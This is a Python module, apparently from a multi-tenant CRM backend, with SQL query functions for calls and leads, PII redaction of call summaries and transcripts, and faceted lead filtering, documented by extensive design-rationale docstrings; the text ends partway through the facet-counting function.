"""CRM business logic AND queries — no repository layer (BACKEND-PATTERNS §1, §10).

Everything here runs on a session whose transaction already carries `app.tenant_id`,
so the isolation is RLS's job and no query in this file carries a `WHERE tenant_id`
belt for a belt-and-braces effect. That is deliberate: a `tenant_id` filter written by
hand is a filter that can be forgotten, and its presence would make it tempting to
trust the filter instead of the policy.
"""

from __future__ import annotations

import csv
import io
import re
from collections.abc import Sequence
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from typing import Any, Literal, NamedTuple, get_args
from uuid import UUID

from calevate_shared.events import CallStatus
from calevate_shared.extraction import ExtractionField, OutcomeTag
from pydantic import ValidationError
from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncSession

from apps.api.agents.business_hours import count_after_hours_calls
from apps.api.billing.caps import read_spend_counters
from apps.api.core.errors import ProblemError
from apps.api.core.spreadsheet_safety import disarm_for_csv
from apps.api.crm import columns as lead_column_registry
from apps.api.crm.attention import BLOCK_REMEDIES
from apps.api.crm.performance import IST_DAY_SQL, IST_HOUR_SQL, IST_TODAY_SQL
from apps.api.crm.schemas import (
    MAX_BULK_LEADS,
    CallDetailOut,
    CallMomentOut,
    CallSummaryOut,
    DashboardDayOut,
    DashboardOut,
    LeadOut,
    LeadStatus,
    LeadTimelineEventOut,
    LeadTimelineOut,
    TranscriptTurnOut,
)
from apps.api.db.base import uuid7
from apps.api.db.result import rowcount_of
from apps.api.db.session import session_tenant
from apps.api.db.transition import transition_status

# The SAME pass that produced `text_redacted` — see `redacted_summary`. Imported at
# module scope unlike `apps.workers.storage` in routes.py: `redaction` is pure regex
# with no third-party import behind it, so it costs nothing at cold start, and a lazy
# import of the function that enforces hard rule 5 is a function that is easy to
# forget to call.
from apps.workers.redaction import redact

MAX_PAGE = 200

# Read off the response model's own Literal rather than retyped here, so the six
# buckets the API promises and the six the DB CHECK constraint allows cannot drift
# apart in a way that silently drops a status from every client's tally.
LEAD_STATUSES: tuple[str, ...] = get_args(LeadStatus)

# The CSV export is the one read here with no page to bound it, and it materializes
# every row AND the whole file in the request. A tenant with 50k leads would turn one
# click into a hung worker, so the read is bounded and says so when it hits the bound —
# a silently truncated contact export is a worse failure than a refused one.
MAX_EXPORT_ROWS = 20_000

#: One faceted filter: an extraction-schema key → the values selected under it. Values
#: are OR'd, keys are AND'd (`_lead_scope`), which is the standard faceted-search
#: semantic and the one users already expect from every storefront they have used.
FieldFilters = dict[str, list[str]]

#: The rail's whole latency budget, in milliseconds. Researched number, and the one
#: `lead_facets` has always claimed to be inside; it is a ceiling on the SCREEN, not on
#: any one query, because a filter rail is a single thing to the person waiting for it.
FACET_RAIL_BUDGET_MS = 200

#: What one facet costs at the volume `list_leads` names as the point where a lead table
#: stops being small: **~50 ms** for a `GROUP BY` over 50,001 tenant leads, measured with
#: `EXPLAIN (ANALYZE, BUFFERS)` as the app role with RLS in the plan (PG 16.15). It is
#: the whole cost — a facet count must read every row in scope by definition, so there is
#: no index and no rewrite that makes one facet cheaper. Rounded UP from the 47.4-50.6 ms
#: measured band, because a budget divided by an optimistic cost is not a budget.
FACET_QUERY_COST_MS = 50

#: How many facets a panel may offer at once — DERIVED, not chosen (D-216).
#:
#: This was 8, on the research that 5-7 facets per results page is the point a filter
#: rail stops being scannable, "with room for a client whose capture list is genuinely
#: enum-heavy". That is a good argument about SCANNABILITY and it was the only argument
#: the number had: eight facets is eight sequential round trips, ~400 ms at six figures,
#: and `lead_facets`' own docstring promised the rail was "nowhere near" its 200 ms
#: budget. A ceiling nothing enforces is a promise, so the ceiling is now the budget
#: divided by what one facet costs, and widening either input moves it automatically.
#:
#: **The single-round-trip rewrite was written and measured before this was chosen, not
#: assumed away.** Both shapes were tried against the same 50,001-lead tenant: a
#: `CROSS JOIN unnest(keys)` with a per-facet `row_number()` window (209-221 ms, 12 MB
#: spilled to disk) and `GROUP BY GROUPING SETS ((1),(2),…,(8))` (223 ms). Both are ~2.8x
#: better than eight sequential queries and BOTH ARE STILL OVER THE BUDGET, because
#: PostgreSQL will not hash-aggregate either one: it has no `n_distinct` for
#: `data ->> 'key'` on a jsonb column whose key is bound at runtime, estimates every row
#: as its own group, and picks a sort. Forcing the hash shows the floor is 111 ms — real,
#: and unreachable without an `enable_sort = off` nobody should ship. So the rewrite buys
#: a 2.8x speedup, does not buy the budget, and costs the readability its rejection was
#: argued on. Bounding buys the budget outright.
#:
#: **What the client gets is a refusal they can act on, and it already exists**: the
#: first `MAX_FACET_FIELDS` facetable fields IN SCHEMA ORDER, plus
#: `FacetSet.omitted_field_count`, which the rail renders as "N more capture fields are
#: filterable but not shown here — ask us to reorder your capture list if you need one of
#: them". Reordering the extraction schema is the action, and it is one an operator can
#: take today. No shipped vertical template declares more than two enum fields, so this
#: bound is twice what anything on the platform uses.
MAX_FACET_FIELDS = FACET_RAIL_BUDGET_MS // FACET_QUERY_COST_MS

#: How many distinct values one facet may offer. Declared enum values are always shown;
#: this bounds the UNDECLARED ones a client's data can also contain (a schema edited
#: after rows were captured), which is otherwise unbounded.
MAX_FACET_VALUES = 50


def redacted_summary(value: str | None) -> str | None:
    """`calls.summary` through the SAME redaction pass that produced `text_redacted`.

    THE DEFECT. `summary` is written to the calls row unredacted
    (`workers/pipeline._persist_extraction`) and it is transcript-derived prose: the
    offline extractor's is a transcript line copied VERBATIM, and the model path is no
    safer, because the prompt asks for two sentences with nothing constraining what may
    appear inside them — which is exactly what `compliance/export.py` says about this
    column when it masks foreign numbers out of it before a subject access request
    ships. Returned raw by the list and the detail, it let a `staff` reader — the role
    DATA-MODEL §2 defines as "no raw transcripts" — read transcript content off the
    ordinary calls screen with no `calls:read_raw` check and no `audit_log` row. That is
    hard rule 5, and every other surface carrying this column already redacted it on the
    way out: the `call.completed` webhook, the hot-lead notification, the DPDP export.
    The screen the client actually looks at was the one that did not.

    THREE FIXES WERE AVAILABLE. This is the one that keeps the product.

    - *Gate the raw summary behind `calls:read_raw` + audit*, like the raw transcript.
      Correct for the artefact, wrong for the surface: staff are the people who work the
      calls queue, and a list of rows with an empty summary column is not a scannable
      list — it is a screen that has to be clicked through one call at a time. It would
      also read as a data loss to every client, for a column they see all day. Note that
      this option is not LOST: `get_call(raw=True)` returns the summary unredacted, so
      the audited raw-transcript route already IS the "see everything" path, and it is
      role-checked and audit-logged exactly as hard rule 5 requires.
    - *Stop the extractor producing verbatim summaries.* Necessary-looking and
      insufficient: it fixes neither the model path (free prose can quote a number the
      caller read out) nor the rows already stored — the breach is in data at rest, and
      a fix that only changes future extraction leaves every existing summary exposed
      behind a backfill migration. It would also change what the deterministic offline
      baseline emits, which is what the eval ratchet scores.
    - *Redact on the way out* — this one. The rule's own line is `text` vs
      `text_redacted`, and the redacted transcript is what a `calls:read` holder is
      already entitled to see. Putting the summary through the very same `redact()` call
      puts it on the permitted side of that exact line: the summary can now say no more
      than the redacted transcript it was derived from, and it stays a summary — prose,
      readable, scannable — because redaction is surgical about phone numbers, Aadhaar,
      PAN, cards, OTPs, emails and spoken digit runs, and leaves the sentence alone.

    It is a per-field judgement, not a blanket one, and the field beside it proves that:
    `LeadOut.data` is deliberately NOT redacted, because the client defined those
    extraction fields to capture this caller and masking them would delete the product.
    A summary is prose nobody specified; a captured field is prose somebody asked for.

    Cost, stated plainly: a caller who dictates a number now reads as
    `[phone ••23]` on the list. The owner who needs the digits has the audited route,
    and the lead's own number is on the row already.
    """
    if not value:
        return value
    return redact(value).text


# --- calls --------------------------------------------------------------------


async def list_calls(
    session: AsyncSession,
    *,
    limit: int = 50,
    offset: int = 0,
    status: str | None = None,
    agent_id: UUID | None = None,
) -> list[CallSummaryOut]:
    clauses = []
    params: dict[str, Any] = {"limit": min(limit, MAX_PAGE), "offset": offset}
    if status:
        clauses.append("c.status = :status")
        params["status"] = status
    if agent_id:
        clauses.append("c.agent_id = :agent_id")
        params["agent_id"] = agent_id
    where = f"WHERE {' AND '.join(clauses)}" if clauses else ""

    rows = (
        await session.execute(
            text(
                "SELECT c.id, c.agent_id, a.name, c.direction, c.status, c.from_e164, "
                "c.to_e164, c.started_at, c.duration_s, c.outcome_tag, c.sentiment, "
                "c.summary, c.lead_id "
                f"FROM calls c JOIN agents a ON a.id = c.agent_id {where} "
                "ORDER BY c.started_at DESC NULLS LAST, c.id DESC LIMIT :limit OFFSET :offset"
            ),
            params,
        )
    ).all()
    return [
        CallSummaryOut(
            id=r[0],
            agent_id=r[1],
            agent_name=r[2],
            direction=r[3],
            status=r[4],
            caller_e164=r[5] if r[3] == "inbound" else r[6],
            started_at=r[7],
            duration_s=r[8],
            outcome_tag=r[9],
            sentiment=r[10],
            # There is no raw variant of the LIST — no route, no permission, no audit
            # row — so this one is redacted unconditionally.
            summary=redacted_summary(r[11]),
            lead_id=r[12],
        )
        for r in rows
    ]


async def get_call(session: AsyncSession, call_id: UUID, *, raw: bool = False) -> CallDetailOut:
    """`raw=True` returns unredacted transcript text AND the unredacted summary. The
    CALLER is responsible for the role check and the audit_log write — this function
    does not decide policy, it just stops the default path from ever reaching the raw
    column.

    `summary` moves with the transcript rather than having a switch of its own: it is
    derived from the transcript (`redacted_summary` states the reasoning), so a reader
    entitled to one is entitled to the other, and a reader entitled to neither must not
    be handed one of them through the back door.
    """
    row = (
        await session.execute(
            text(
                "SELECT c.id, c.agent_id, a.name, c.direction, c.status, c.from_e164, "
                "c.to_e164, c.started_at, c.duration_s, c.outcome_tag, c.sentiment, "
                "c.summary, c.lead_id, c.recording_url, c.disclosure_played "
                "FROM calls c JOIN agents a ON a.id = c.agent_id WHERE c.id = :cid"
            ),
            {"cid": call_id},
        )
    ).first()
    if row is None:
        raise ProblemError.not_found("Call")

    column = "text" if raw else "text_redacted"
    turns = (
        await session.execute(
            text(
                f"SELECT idx, speaker, COALESCE({column}, ''), lang, start_ms "
                "FROM transcript_turns WHERE call_id = :cid ORDER BY idx"
            ),
            {"cid": call_id},
        )
    ).all()
    extraction = (
        await session.execute(
            text(
                "SELECT data, valid, moments, needs_review FROM call_extractions "
                "WHERE call_id = :cid ORDER BY created_at DESC LIMIT 1"
            ),
            {"cid": call_id},
        )
    ).first()

    return CallDetailOut(
        id=row[0],
        agent_id=row[1],
        agent_name=row[2],
        direction=row[3],
        status=row[4],
        caller_e164=row[5] if row[3] == "inbound" else row[6],
        started_at=row[7],
        duration_s=row[8],
        outcome_tag=row[9],
        sentiment=row[10],
        summary=row[11] if raw else redacted_summary(row[11]),
        lead_id=row[12],
        has_recording=bool(row[13]),
        disclosure_played=row[14],
        transcript=[
            TranscriptTurnOut(
                idx=t[0], speaker=t[1], text=t[2], lang=t[3], start_ms=t[4], redacted=not raw
            )
            for t in turns
        ],
        extraction=(extraction[0] or {}) if extraction else {},
        extraction_valid=bool(extraction[1]) if extraction else True,
        moments=_moments_out(extraction[2] if extraction else None, raw=raw),
        # Per-field "confirm before acting" advisories (P4). NOT on the redaction switch:
        # the reasons are PII-free by construction (the flagged value lives in `extraction`
        # above, this map names only the field and why), so one form serves both the
        # redacted and the raw read.
        extraction_needs_review=(
            extraction[3] if extraction and isinstance(extraction[3], dict) else {}
        ),
    )


def _moments_out(stored: Any, *, raw: bool) -> list[CallMomentOut]:
    """The stored markers, on the SAME redaction switch as the transcript above.

    `raw=False` takes `label_redacted`, `raw=True` takes `label`. A marker's label can
    quote the caller — a model-authored one always does — so it has to move with the rest
    of the screen's text or it becomes the one field that leaks (hard rule 5). The
    endpoint that returns raw already writes an `audit_log` row for the whole read, which
    is what makes one switch sufficient rather than needing a second gate here.

    Unknown or malformed elements are DROPPED rather than raised on. This column is
    written by a worker and read by a request; a marker whose `kind` a later release
    retired must not turn a client's call detail into a 500 on the deploy that removes it.
    Dropping loses one row of a navigation aid, and the transcript beneath is untouched.
    """
    if not isinstance(stored, list):
        return []
    out: list[CallMomentOut] = []
    for item in stored:
        if not isinstance(item, dict):
            continue
        label = _label_for(item, raw=raw)
        if label is None:
            continue
        try:
            out.append(
                CallMomentOut(
                    at_ms=int(item["at_ms"]),
                    kind=item["kind"],
                    label=label,
                    source=item["source"],
                )
            )
        except (KeyError, TypeError, ValueError, ValidationError):
            continue
    return sorted(out, key=lambda m: m.at_ms)


def _label_for(item: dict[str, Any], *, raw: bool) -> str | None:
    """Which of a stored marker's two labels this view may show, or None to drop it.

    The raw view takes `label`. The redacted view takes `label_redacted` — and when that
    key is ABSENT the answer depends on who wrote the marker, which is the only place in
    this file where `source` changes behaviour rather than presentation:

    * a `derived` label is generated from the field's own name and provably carries no
      caller data (`workers/moments._moment` sets both keys to one string), so falling
      back to `label` shows the right text and keeps the marker;
    * a `model` label quotes the caller. Falling back there would print raw text in the
      view whose entire promise is that it does not (hard rule 5), so the marker is
      dropped instead.

    The alternative — trusting that the writer always sets both — is the assumption every
    redaction defect in this repo has been made of. A row can also arrive from a restore,
    a hand-fix, or a release that changed the shape.
    """
    if raw:
        value = item.get("label")
        return str(value) if value is not None else None
    redacted = item.get("label_redacted")
    if redacted is not None:
        return str(redacted)
    if item.get("source") == "derived":
        fallback = item.get("label")
        return str(fallback) if fallback is not None else None
    return None


class RecordingRef(NamedTuple):
    """Where OUR copy of a call's audio is, and how long it plays for.

    The duration travels WITH the key because the caller needs both to mint a link that
    outlives the audio, and reading them in two queries would let a retention sweep
    delete the row between them — answering with a key whose duration is a guess.
    """

    key: str
    duration_s: int | None


async def recording_ref_for(session: AsyncSession, call_id: UUID) -> RecordingRef:
    """The object key for this call's recording, or a 404 that says WHICH thing is absent.

    Two different 404s on purpose (the D-65 discriminator applied to a read): a call id
    that names nothing is "Call", and a real call that was never recorded — or whose
    audio a retention sweep has already destroyed — is "Recording". An owner who mistyped
    a URL and an owner whose 90 days elapsed need different next actions.
    """
    row = (
        await session.execute(
            text("SELECT recording_url, duration_s FROM calls WHERE id = :cid"),
            {"cid": call_id},
        )
    ).first()
    if row is None:
        raise ProblemError.not_found("Call")
    if not row[0]:
        raise ProblemError.not_found("Recording")
    return RecordingRef(key=str(row[0]), duration_s=int(row[1]) if row[1] is not None else None)


# --- leads --------------------------------------------------------------------


async def lead_columns(
    session: AsyncSession, agent_id: UUID | None = None
) -> list[ExtractionField]:
    """The Leads table columns ARE the extraction schema (TRD §7). With no agent filter
    we take the most recently published schema — a v1 tenant has exactly one agent, and
    a mixed list is better served by the per-agent view."""
    params: dict[str, Any] = {}
    where = ""
    if agent_id:
        where = "WHERE agent_id = :aid"
        params["aid"] = agent_id
    row = (
        await session.execute(
            text(f"SELECT fields FROM extraction_schemas {where} ORDER BY version DESC LIMIT 1"),
            params,
        )
    ).first()
    if row is None or not row[0]:
        return []
    return [ExtractionField.model_validate(f) for f in row[0]]


# The lead row's columns, in `_lead_out`'s order, and the join that names its owner.
#
# `memberships` carries the join rather than `users` directly, and that is the whole
# tenancy control on this line: `users` is a GLOBAL table with no RLS (DATA-MODEL §2 —
# identity crosses tenants), so `JOIN users ON users.id = l.assigned_to` would happily
# print a stranger's name. `memberships` IS force-RLS'd on `tenant_id`, so a row this
# tenant may not see resolves to NULL and `LeadOut.assigned_to_name` says so.
_LEAD_COLUMNS = (
    "l.id, l.phone_e164, l.name, l.status, l.source, l.data, l.schema_version, "
    "l.call_count, l.is_repeat_caller, l.last_call_id, l.created_at, l.updated_at, "
    "l.assigned_to, owner.name AS assigned_to_name"
)
_LEAD_OWNER_JOIN = (
    "LEFT JOIN memberships m ON m.user_id = l.assigned_to "
    "LEFT JOIN users owner ON owner.id = m.user_id"
)


def _lead_scope(
    params: dict[str, Any],
    *,
    search: str | None,
    agent_id: UUID | None,
    assigned_to: UUID | None = None,
    field_filters: FieldFilters | None = None,
    skip_field: str | None = None,
) -> list[str]:
    """The filters that define WHICH leads a request is about, minus `status`.

    Shared by the list, its per-status counts and the CSV export, so that "export what
    I am looking at" is a property of one function rather than a coincidence between
    three copies of a WHERE clause. `status` is deliberately not here: the counts need
    the scope WITHOUT it (see `list_leads_page`).

    Every clause is qualified `l.`, and every caller therefore says `FROM leads l`. That
    is not decoration: the row query joins `users` to name the owner, and `users.name`
    and `leads.name` would otherwise make the search clause an ambiguous-column error.

    `agent_id` filters ROWS. It used to select only the extraction schema that supplies
    the table's COLUMNS while every agent's rows came back, so a two-agent tenant read
    agent B's leads under agent A's capture list — and the export's own too-large
    remediation ("Export one agent at a time with ?agent_id=") could never relieve the
    cap it advertised. `leads.agent_id` is NOT NULL and part of
    UNIQUE(tenant_id, phone_e164, agent_id), so a lead belongs to exactly one agent and
    "rows for this agent" is well defined (DATA-MODEL §5).

    `assigned_to` is the "my leads" filter and lives HERE for the reason the paragraph
    above records about `agent_id`: a filter the screen applies and the export ignores
    is how somebody narrows the table to their own twenty leads, presses Export and
    mails a supplier the whole contact list. It is a real predicate on a real column —
    never a slice of the page — and migration d2b6f04a17c9 measured the partial index
    that keeps it off a sequential scan.

    `field_filters` are the FACETS, and they are the same kind of predicate for the same
    reason: they narrow the table, so they must narrow the file. Each entry is one
    extraction-schema key and the values selected under it, and the shape follows the
    researched standard — OR within a facet (`= ANY`), AND across facets (one clause
    each). Keys reach here already checked against the agent's extraction schema by the
    route; they are still bound parameters rather than interpolated, because "validated
    upstream" is a fact about today's caller.

    `skip_field` omits ONE facet's own clause, which is what makes a facet count
    answerable: "how many rows would this value give me" is a question about the table
    with every OTHER filter applied. It is the same decision `status_counts` already
    makes about `status`, spelled the same way.
    """
    clauses = ["l.deleted_at IS NULL"]
    if search:
        # Name or phone suffix. Never a LIKE on the full number in a logged query
        # string — the route passes this as a bound parameter for that reason.
        clauses.append("(l.name ILIKE :search OR l.phone_e164 LIKE :phone_suffix)")
        params["search"] = f"%{search}%"
        params["phone_suffix"] = f"%{search}"
    if agent_id:
        clauses.append("l.agent_id = :agent_id")
        params["agent_id"] = agent_id
    if assigned_to:
        clauses.append("l.assigned_to = :assigned_to")
        params["assigned_to"] = assigned_to
    for i, (key, values) in enumerate(sorted((field_filters or {}).items())):
        if key == skip_field or not values:
            continue
        # `->>` yields text, so every comparison is a text comparison and a number field
        # matches on its rendered form. Facets are enum fields (crm.columns.facetable),
        # where the stored value IS the declared string, so this is exact rather than
        # lucky — a numeric facet would need a cast and there is deliberately no such
        # thing yet.
        clauses.append(f"l.data ->> :ff_k{i} = ANY(:ff_v{i})")
        params[f"ff_k{i}"] = key
        params[f"ff_v{i}"] = list(values)
    return clauses


@dataclass(frozen=True, slots=True)
class LeadPage:
    """One page of leads, plus the two numbers that describe what it is a page OF."""

    items: list[LeadOut]
    # Rows matching EVERY filter, `status` included — what "showing 50 of 140" counts.
    total: int
    # status → count across ALL six statuses, for the same search/agent scope. Never
    # narrowed by `status`, which is the whole reason it exists.
    status_counts: dict[str, int]


async def list_leads_page(
    session: AsyncSession,
    *,
    limit: int = 50,
    offset: int = 0,
    status: str | None = None,
    search: str | None = None,
    agent_id: UUID | None = None,
    assigned_to: UUID | None = None,
    field_filters: FieldFilters | None = None,
) -> LeadPage:
    """A page of leads and a truthful per-status breakdown of the set it came from.

    **Two queries, same as before.** The `SELECT count(*)` that produced `total` is now
    a `GROUP BY status` over the scope MINUS the status filter, and `total` is read back
    out of that map (or is its sum when no status is asked for). Same single pass over
    the same rows, a hash aggregate over at most six groups on top, and no second trip:
    the per-status counts are effectively free relative to the count we already paid
    for. Costing them as a separate query would have doubled the scan on every keystroke
    of the debounced search, which is the version of this that was not worth shipping.

    The counts follow the SEARCH (and the agent scope) and ignore the STATUS filter.
    That is the only combination that answers the question the UI is asking — "of what
    I am looking at, how much sits in each stage" — and it is also the cheap one: a
    whole-account breakdown next to a searched page would need its own unfiltered scan.
    The response field is named `status_counts_matching_search` so a reader never has to
    come here to find out which it is.
    """
    params: dict[str, Any] = {"limit": min(limit, MAX_PAGE), "offset": offset}
    scope = _lead_scope(
        params,
        search=search,
        agent_id=agent_id,
        assigned_to=assigned_to,
        field_filters=field_filters,
    )
    scope_where = f"WHERE {' AND '.join(scope)}"

    grouped = (
        await session.execute(
            text(f"SELECT l.status, count(*) FROM leads l {scope_where} GROUP BY l.status"), params
        )
    ).all()
    # Zero-fill: a status the tenant has none of must answer 0, not go missing. The UI
    # renders one badge per status, and an absent key there is indistinguishable from a
    # field the server failed to send.
    counts = dict.fromkeys(LEAD_STATUSES, 0)
    for name, count in grouped:
        counts[str(name)] = int(count)
    # A status outside the enum matches no rows, which is exactly what `.get(..., 0)`
    # says — and the row query below independently agrees by returning nothing.
    total = counts.get(status, 0) if status else sum(counts.values())

    row_clauses = list(scope)
    if status:
        row_clauses.append("l.status = :status")
        params["status"] = status
    rows = (
        await session.execute(
            text(
                f"SELECT {_LEAD_COLUMNS} "
                f"FROM leads l {_LEAD_OWNER_JOIN} WHERE {' AND '.join(row_clauses)} "
                # `id DESC` is not decoration. OFFSET pagination is only correct over a
                # TOTAL order, and `updated_at` is not one: leads written by a single
                # import share it to the microsecond, and Postgres is free to order ties
                # differently per query — so a row lands on two pages while another
                # lands on none, with `total` staying right throughout. Offset itself is
                # kept deliberately (see the note in `list_leads`).
                # Qualified `l.`, like every other column here: `memberships` and `users`
                # both carry an `id` and an `updated_at`, so the owner join turns a bare
                # ORDER BY into an ambiguous-column error rather than a wrong sort.
                "ORDER BY l.updated_at DESC, l.id DESC LIMIT :limit OFFSET :offset"
            ),
            params,
        )
    ).all()
    return LeadPage(items=[_lead_out(r) for r in rows], total=total, status_counts=counts)


async def leads_ranked_by_id(
    session: AsyncSession,
    *,
    lead_ids: Sequence[UUID],
    status: str | None = None,
    search: str | None = None,
    agent_id: UUID | None = None,
    assigned_to: UUID | None = None,
    field_filters: FieldFilters | None = None,
) -> list[LeadOut]:
    """These leads, in the order they were given, with the Leads screen's filters applied.

    THE HYDRATION HALF OF SEMANTIC SEARCH (`crm/lead_search.py`). The ranking comes from
    the caller-chunk store, which knows about vectors and nothing about a client's screen;
    this turns a ranked list of ids back into rows.

    **`_lead_scope` IS REUSED RATHER THAN RE-STATED, and that is the whole design.** Every
    filter the list, the facet counts and the CSV export honour is honoured here by
    construction — a semantic search inside "hot leads assigned to me" is those leads
    ranked, not a second definition of what the set is. A filter added to that function
    reaches this surface with no change here, which is the property the alternative (a
    hand-written WHERE clause for search) would have quietly lost.

    ORDER IS THE CALLER'S, restored by `array_position` over the ids: an RRF score is not a
    column of `leads` and re-sorting by `updated_at` would throw the ranking away. A lead
    the filters excluded is simply absent, which is why the caller ranks deeper than it
    displays and reports what it actually got rather than promising `k` rows.
    """
    if not lead_ids:
        return []
    params: dict[str, Any] = {"ids": list(lead_ids)}
    clauses = _lead_scope(
        params,
        search=search,
        agent_id=agent_id,
        assigned_to=assigned_to,
        field_filters=field_filters,
    )
    clauses.append("l.id = ANY(:ids)")
    if status:
        clauses.append("l.status = :status")
        params["status"] = status
    rows = (
        await session.execute(
            text(
                f"SELECT {_LEAD_COLUMNS} FROM leads l {_LEAD_OWNER_JOIN} "
                f"WHERE {' AND '.join(clauses)} "
                # `array_position` and not a CASE ladder: the ids arrive as a bound array
                # and their POSITION in it is the rank, so the ordering needs no value
                # spliced into the statement (hard rule 1's neighbour, D-172).
                "ORDER BY array_position(CAST(:ids AS uuid[]), l.id)"
            ),
            params,
        )
    ).all()
    return [_lead_out(r) for r in rows]


@dataclass(frozen=True, slots=True)
class FacetValue:
    """One selectable value of one facet, and how many rows it would give you."""

    value: str
    count: int
    #: Is this value in the extraction schema's `enum_values`? A `False` here is a value
    #: the client's DATA contains and their capture list no longer declares — a schema
    #: edited after rows were captured. It is offered anyway, because a value that
    #: demonstrably exists and cannot be filtered on is a table that lies about itself,
    #: and it is flagged so the UI can say which of the two it is.
    declared: bool


@dataclass(frozen=True, slots=True)
class Facet:
    """One extraction-schema enum field, rendered as a filter group."""

    key: str
    label: str
    values: tuple[FacetValue, ...]


@dataclass(frozen=True, slots=True)
class FacetSet:
    facets: tuple[Facet, ...]
    #: Enum fields beyond `MAX_FACET_FIELDS`. Reported rather than hidden — a client
    #: whose ninth facet is missing should be told, not left to wonder.
    omitted_field_count: int


async def lead_facets(
    session: AsyncSession,
    *,
    fields: list[ExtractionField],
    agent_id: UUID | None = None,
    status: str | None = None,
    search: str | None = None,
    assigned_to: UUID | None = None,
    field_filters: FieldFilters | None = None,
) -> FacetSet:
    """The filter rail, counted over the set the client is actually looking at.

    **Counts follow every OTHER filter and ignore this facet's own** (`skip_field`).
    That is the researched standard — OR within a group, AND across groups, with counts
    that answer "what would selecting this give me" — and it is the same rule
    `status_counts_matching_search` already applies one screen element over, so the two
    numbers on this page mean the same kind of thing.

    **One query per facet, and the COUNT is what keeps that affordable** (D-216). The
    single-round-trip alternative was written and rejected twice, on different grounds
    each time. First as a UNION ALL: every branch omits a DIFFERENT filter, so every
    branch needs its own uniquely-named binds and its own clause list — the whole scope
    builder duplicated per branch. Then, when a measurement said the rail was over its
    budget, as the two shapes that avoid that duplication: a `CROSS JOIN unnest(keys)`
    with a per-facet `row_number()` window, and `GROUP BY GROUPING SETS`. Both were
    measured against the same tenant, both are ~2.8x faster than the sequential loop at
    eight facets, and **both are still over the 200 ms budget** — PostgreSQL will not
    hash-aggregate either, because it has no `n_distinct` for a jsonb key bound at
    runtime and therefore estimates every row as its own group. The numbers are on
    `MAX_FACET_FIELDS`. So the loop stays and the COUNT is bounded instead:
    `MAX_FACET_FIELDS` is now `FACET_RAIL_BUDGET_MS // FACET_QUERY_COST_MS`, which is
    four, and a client with more facetable fields is told so rather than shown a rail
    that takes half a second.

    **MEASURED, because "nowhere near it" was a claim about an empty table.** One facet
    over 50,001 leads is 47.4-50.6 ms / 2,682 buffers (PG 16.15, `EXPLAIN (ANALYZE,
    BUFFERS)` as the app role with RLS in the plan) — and was 70.5-74.9 ms with 13 MB
    spilled to disk until the `MATERIALIZED` fence below went in. No index changes the
    remaining cost: a facet count reads every row in scope by definition. Four facets is
    ~200 ms at six figures and single-digit milliseconds at the couple of thousand leads
    a real client has; the six-figure case is the one this bound is sized for, because it
    is the one `list_leads` already names as the threshold where a lead table stops being
    small.

    Values are DECLARED-FIRST, in schema order, zero-filled — a value with no rows
    answers 0 rather than going missing, for the reason the status badges do: "none of
    these" and "the server did not say" are different sentences. Undeclared values found
    in the data follow, by descending count.
    """
    facetable = lead_column_registry.facetable(lead_column_registry.available(fields))
    chosen = facetable[:MAX_FACET_FIELDS]

    facets: list[Facet] = []
    for column in chosen:
        params: dict[str, Any] = {"facet_key": column.key}
        clauses = _lead_scope(
            params,
            search=search,
            agent_id=agent_id,
            assigned_to=assigned_to,
            field_filters=field_filters,
            skip_field=column.key,
        )
        if status:
            clauses.append("l.status = :status")
            params["status"] = status
        # `jsonb_typeof(...) = 'string'` rather than a bare NOT NULL: a field whose type
        # changed leaves objects and arrays behind in `data`, and `->>` renders those as
        # their JSON source — a facet value nobody can read and nobody stored.
        clauses.append("jsonb_typeof(l.data -> :facet_key) = 'string'")
        # THE ROW BOUND, and it belongs HERE rather than only in the response.
        # `MAX_FACET_VALUES` says it bounds the undeclared values "which is otherwise
        # unbounded" — and it did bound the rendered list, after the whole GROUP BY had
        # already been transported and turned into a Python dict. A facet is an enum
        # field only by DECLARATION: the extractor writes whatever the model produced, so
        # a field whose declaration changed (or whose model went off-script) can hold as
        # many distinct strings as the tenant has leads, and this loop allocated one dict
        # entry per one of them, eight times per page render.
        #
        # DECLARED-FIRST IS WHAT MAKES THE LIMIT SAFE. A bare `LIMIT` would drop a
        # declared value that ranks below the cap and the zero-fill below would then
        # report it as 0 — a filter that silently claims a value nobody has. Sorting the
        # declared ones ahead of the tail guarantees every declared value present in the
        # data survives the cut, and the cap is exactly what the response can render.
        params["facet_declared"] = list(column.enum_values)
        room = max(MAX_FACET_VALUES - len(column.enum_values), 0)
        params["facet_cap"] = len(column.enum_values) + room
        # THE AGGREGATE IS FENCED OFF FROM THE ORDERING, and the fence is load-bearing
        # (D-216). `AS MATERIALIZED` is what stops PostgreSQL from folding the `ORDER BY`
        # above into the plan below it.
        #
        # Written as one flat statement — `GROUP BY 1 ORDER BY <declared> DESC, n DESC
        # LIMIT :cap` — the planner has no `n_distinct` for `data ->> :key` (a jsonb key
        # bound at runtime cannot carry statistics), estimates a couple of hundred groups,
        # and decides a sorted GroupAggregate is as cheap as a hash. It is not: the sort
        # it chooses runs over the FULL-WIDTH lead rows, and on a 50,001-lead tenant that
        # is an `external merge  Disk: 13296kB` — 13 MB written and read back per facet,
        # per page render, on a table the query never needed to sort at all. Measured
        # 70.5-74.9 ms.
        #
        # With the grouping in a materialized CTE the sort underneath it carries the
        # extracted TEXT (width 32, not 285), fits in `work_mem` as a quicksort, and the
        # spill is gone: 47.4-50.6 ms, temp blocks 0. Same rows, same order, same LIMIT —
        # this changes the plan and not the answer. It is a regression D-209 introduced
        # while fixing a real unboundedness, which is why the fix keeps its LIMIT.
        #
        # NOT an optimiser hint in disguise: `MATERIALIZED` is the documented way to say
        # "evaluate this once, on its own terms" (PostgreSQL 16, SQL-SELECT §WITH), and it
        # is already the spelling `claim_outbox_batch` and the campaign dispatcher use for
        # the same reason — one meaning per keyword in this repo.
        rows = (
            await session.execute(
                text(
                    "WITH counted AS MATERIALIZED ("
                    "  SELECT l.data ->> :facet_key AS value, count(*) AS n "
                    f"  FROM leads l WHERE {' AND '.join(clauses)} "
                    "  GROUP BY 1"
                    ") "
                    "SELECT value, n FROM counted "
                    "ORDER BY (value = ANY(:facet_declared)) DESC, n DESC, value ASC "
                    "LIMIT :facet_cap"
                ),
                params,
            )
        ).all()
        observed = {str(value): int(n) for value, n in rows}

        values = [
            FacetValue(value=v, count=observed.pop(v, 0), declared=True) for v in column.enum_values
        ]
        values.extend(
            FacetValue(value=v, count=n, declared=False)
            for v, n in sorted(observed.items(), key=lambda kv: (-kv[1], kv[0]))[:room]
        )
